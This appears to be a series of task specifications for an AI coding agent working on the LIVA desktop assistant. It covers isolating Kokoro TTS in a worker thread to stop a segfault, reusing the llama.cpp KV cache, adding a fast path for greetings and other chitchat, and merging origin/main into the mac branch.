This project focuses on resolving the local inference response latency and crash issues for the LIVA desktop assistant on macOS (Apple Silicon) to achieve real-time responsiveness (< 3 seconds). It addresses the root cause of the 10-20s delays: a gateway segfault (exit code 139) when loading the `onnxruntime-node` native addon in both the main thread (for Kokoro TTS fallback) and the `EmbeddingWorker` thread, which crash-cycles the model server. The solution is to isolate Kokoro TTS inside its own dedicated worker thread (`KokoroWorker.ts`) and optimize KV cache clearing on the GPU.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

> **MANDATORY**: Before writing ANY code, read `/Users/duongnad/Documents/project/LIVA/AI_CONTEXT.md` — it contains the complete tech stack, banned libraries, coding standards, and anti-patterns. Violations are REJECTED.

> **Branch rule**: You are on the `mac` branch. All work MUST stay on `mac`. Do NOT commit or push — staging (`git add`) is the boundary.

## Requirements

### R1. Fix Kokoro TTS Fallback Segfault via Worker Thread Isolation
Bypass the native addon conflict on macOS by isolating ONNX Runtime inside worker threads:
1. **Dedicated Kokoro Worker**: Create a new worker [KokoroWorker.ts](file:///Users/duongnad/Documents/project/LIVA/liva-gateway/src/workers/KokoroWorker.ts) that handles `KokoroTTS` loading on `"cpu"` and calls `generate()` to produce the WAV buffer.
2. **Refactor KokoroVoiceEngine**: Update [KokoroVoiceEngine.ts](file:///Users/duongnad/Documents/project/LIVA/liva-gateway/src/services/KokoroVoiceEngine.ts) to spawn the `KokoroWorker.ts` thread and communicate with it using messages. The main thread must never import `kokoro-js` or load `onnxruntime-node` directly.
3. **Crash-Free Fallback**: Ensure that when the gateway fails to connect to the Python Edge-TTS service, it falls back to the isolated Kokoro worker smoothly without crashing the gateway process.

### R2. Optimize KV Cache Clearing on GPU/Metal
Optimize the local Python engine context reset during inference turns:
1. **Reuse llama.cpp Context**: In [liva_native_engine.py](file:///Users/duongnad/Documents/project/LIVA/liva-ai-engine/liva_native_engine.py) (specifically within `_generate_stream_unsafe`), when `is_gpu` and `is_dirty` are true, use `lib.llama_kv_cache_clear(self.ctx)` instead of completely freeing and recreating the C++ context.
2. **Reallocation Overhead Avoidance**: Confirm that the context is cleared instantly without incurring Metal shader compilation or context recreation overhead on every turn.

## Acceptance Criteria

### Gateway Stability & Fallback
- [ ] Main thread does not import `kokoro-js` or `onnxruntime-node`
- [ ] Gateway no longer crashes (no exit code 139) during TTS fallback initialization
- [ ] Gateway runs continuously without restarting when transitioning to Kokoro local TTS
- [ ] Running `test_kokoro.js` or manual TTS testing succeeds on CPU

### Inference Performance
- [ ] `liva_native_engine.py` context is not recreated when clearing a dirty cache on GPU
- [ ] Initial token response latency is under 3 seconds for consecutive queries
- [ ] All existing gateway and engine tests pass: `npm run test -w liva-gateway` and python pytest suite

## Follow-up — 2026-06-11T06:16:14Z

This project focuses on optimizing LIVA's response speed for basic tasks (like greetings, pleasantries, and goodbyes) by implementing a Chitchat Fast-Path. This will bypass the local LLM and its VRAM loading overhead entirely, responding in under 50ms.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

> **MANDATORY**: Before writing ANY code, read `/Users/duongnad/Documents/project/LIVA/AI_CONTEXT.md` — it contains the complete tech stack, banned libraries, coding standards, and anti-patterns. Violations are REJECTED.

> **Branch rule**: You are on the `mac` branch. All work MUST stay on `mac`. Do NOT commit or push — staging (`git add`) is the boundary.

## Requirements

### R1. Implement Chitchat Fast-Path Responder
Create a lightweight, deterministic chitchat responder to handle common greetings and chitchat instantly:
1. **Fast-Path Logic**: Create `ChitchatFastPath.ts` to normalize query text and match it against common chitchat intents:
   - Greetings (e.g., "chào", "hello")
   - Pleasantries/Health (e.g., "khỏe không", "how are you")
   - Identity (e.g., "tên gì", "who are you")
   - Thanks (e.g., "cảm ơn", "thank you")
   - Goodbye (e.g., "tạm biệt", "bye")
2. **Randomized Responses**: Select a friendly, natural response from a randomized pool for each matched intent.
3. **LLM Fallback**: If a chitchat query does not match these simple intents (e.g., "tell me a joke"), return `null` so it falls back to the LLM.

### R2. Integrate into Agent Loop
Intercept queries within the gateway's input pipeline:
1. **Bypass LLM**: In `AgentLoop.ts`, if the route is `chitchat`, check the fast-path. If a response is resolved, bypass the LLM and return the response immediately.
2. **Update Memory**: Ensure the fast-path interaction is correctly logged to LIVA's chat memory.

## Acceptance Criteria

### Latency & Efficiency
- [ ] Chitchat queries matching fast-path intents respond in <50ms
- [ ] Fast-path greetings bypass LLM inference (no model load/eval triggered)
- [ ] Complex chitchat queries (e.g., jokes, questions) still fall back to the LLM

### Code Quality & Verification
- [ ] All unit tests in `AgentLoop.test.ts` pass successfully
- [ ] Staged changes are verified and clean on the `mac` branch

## Follow-up — 2026-06-11T06:40:55Z

Research and integrate the performance optimizations and bug fixes from `origin/main` into the current `mac` branch, resolving conflicts, maintaining cross-platform compatibility, and verifying via test suites.

Working directory: /Users/duongnad/Documents/project/LIVA
Integrity mode: development

## Requirements

### R1. Analyze Changes & Resolve Merge Conflicts
Identify performance optimizations, bug fixes, and feature additions on `origin/main` (commits since merge base `5311fc5`) and perform a clean integration into `mac`. Resolve any conflicts in:
- Native engine logic (`liva-ai-engine/liva_native_engine.py`, `engine.py`, etc.)
- Gateway logic (`liva-gateway/src/...`)
- UI logic (`liva-ui/src/...`)
- Test files and shared configurations

### R2. Maintain Platform-Specific Optimizations
Ensure macOS-specific optimizations (like Kokoro TTS worker, Darwin VRAM limits, early exit fast-path) are not broken or overwritten by Windows-specific optimizations or changes on `origin/main`. Maintain compile-safe checks and OS conditions.

### R3. Run Verification Tests
Run the automated test suites for both the python native engine and the node/typescript gateway to verify no regressions:
- Gateway: test command (e.g. `npm run test`)
- Native engine: python tests

## Acceptance Criteria

### Branch Synchronization
- [ ] `origin/main` changes are successfully integrated into `mac` branch
- [ ] No compilation or runtime errors introduced on macOS

### Test Verification
- [ ] Gateway test suite passes successfully
- [ ] AI engine unit tests pass successfully
